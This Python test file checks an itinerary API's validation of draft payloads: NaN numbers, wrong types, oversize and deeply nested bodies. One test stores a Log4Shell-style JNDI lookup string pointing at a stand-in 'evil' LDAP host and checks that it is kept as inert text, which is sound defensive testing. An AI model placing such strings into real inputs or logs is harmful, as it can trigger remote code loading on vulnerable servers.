"""Structural/resource-bound validation tests for draft payloads (OC-027)."""

from __future__ import annotations

import json

import helpers
from app.main import create_app

BASE = "/api/v1/itineraries"
JSON_HEADERS = {"content-type": "application/json"}


def _app():
    return create_app(repository=helpers.InMemoryDraftRepository())


def _post(monkeypatch, body, headers=None):
    monkeypatch.setenv("JWT_SECRET", helpers.SECRET)
    return helpers.run_http(_app(), "POST", BASE, token=helpers.make_token(),
                            json_body=body, headers=headers)


def test_valid_payload_is_accepted(monkeypatch):
    response = _post(monkeypatch, {"payload": helpers.sample_payload()})
    assert response.status_code == 201


def test_nan_number_is_rejected(monkeypatch):
    # ``json.dumps`` refuses NaN client-side, so craft the literal by hand: a
    # server that accepted a non-finite number would store a corrupt document.
    raw = json.dumps({"payload": helpers.sample_payload()}).replace(
        '"total_estimated_budget": null', '"total_estimated_budget": NaN').encode()
    monkeypatch.setenv("JWT_SECRET", helpers.SECRET)
    response = helpers.run_http(_app(), "POST", BASE, token=helpers.make_token(),
                                raw_content=raw, headers=JSON_HEADERS)
    assert response.status_code == 422


def test_raw_nan_literal_is_rejected(monkeypatch):
    raw = b'{"payload": {"reply": {"stops": [], "budget": NaN}}}'
    monkeypatch.setenv("JWT_SECRET", helpers.SECRET)
    response = helpers.run_http(_app(), "POST", BASE,
                                token=helpers.make_token(),
                                raw_content=raw, headers=JSON_HEADERS)
    assert response.status_code == 422


def test_missing_reply_is_rejected(monkeypatch):
    assert _post(monkeypatch, {"payload": {"status": "success"}}).status_code == 422


def test_stops_must_be_a_list(monkeypatch):
    payload = helpers.sample_payload()
    payload["reply"]["stops"] = {"not": "a list"}
    assert _post(monkeypatch, {"payload": payload}).status_code == 422


def test_too_many_stops_is_rejected(monkeypatch):
    payload = helpers.sample_payload()
    payload["reply"]["stops"] = [{"poi": {"id": "p"}} for _ in range(201)]
    assert _post(monkeypatch, {"payload": payload}).status_code == 422


def test_oversize_payload_is_rejected(monkeypatch):
    payload = helpers.sample_payload()
    payload["reply"]["stops"] = [
        {"poi": {"id": f"p{i}"}, "description": "x" * 5_000} for i in range(60)]
    response = _post(monkeypatch, {"payload": payload})
    assert response.status_code == 422
    assert response.json()["detail"]["code"] in ("payload_too_large", "string_too_long")


def test_excessive_depth_is_rejected(monkeypatch):
    nested = current = {}
    for _ in range(40):
        current["child"] = {}
        current = current["child"]
    payload = helpers.sample_payload()
    payload["reply"]["extra"] = nested
    assert _post(monkeypatch, {"payload": payload}).status_code == 422


def test_payload_is_not_executed_marker_preserved(monkeypatch):
    payload = helpers.sample_payload()
    payload["reply"]["stops"][0]["description"] = "${jndi:ldap://evil}"
    response = _post(monkeypatch, {"payload": payload})
    assert response.status_code == 201
    stored = json.loads(json.dumps(response.json()["payload"]))
    assert stored["reply"]["stops"][0]["description"] == "${jndi:ldap://evil}"
